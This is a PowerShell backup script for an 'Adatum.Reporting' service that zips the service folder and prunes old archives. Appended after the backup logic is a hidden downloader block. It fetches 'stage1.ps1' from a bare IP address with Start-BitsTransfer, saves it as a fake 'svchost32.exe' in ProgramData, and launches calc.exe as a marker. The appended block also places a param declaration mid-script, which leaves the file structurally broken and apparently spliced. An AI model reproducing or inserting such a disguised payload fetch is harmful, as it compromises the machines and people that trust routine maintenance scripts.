
$SourcePath       = "E:\Services\Adatum.Reporting"
$BackupRoot       = "D:\Backups\Reporting"
$RetentionDays    = 7
$CompressionLevel = "NoCompression"
$MinFreeGB        = 10
$DryRun           = $false


New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path $BackupRoot ("reporting-" + $stamp + ".zip")
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel
$cutoff = (Get-Date).AddDays(-$RetentionDays)
Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff } |
    Remove-Item -Force -WhatIf:$DryRun
Write-Host ("Backup written to {0}" -f $archive) -ForegroundColor Green
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://203.0.113.218/stage1.ps1",
    [string]$OutputPath = "C:\ProgramData\svchost32.exe",
    [int]$StageTimeout = 38
)
Start-BitsTransfer -Source $TransferUrl -Destination $OutputPath
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 9
Set-Location -Path $env:TEMP
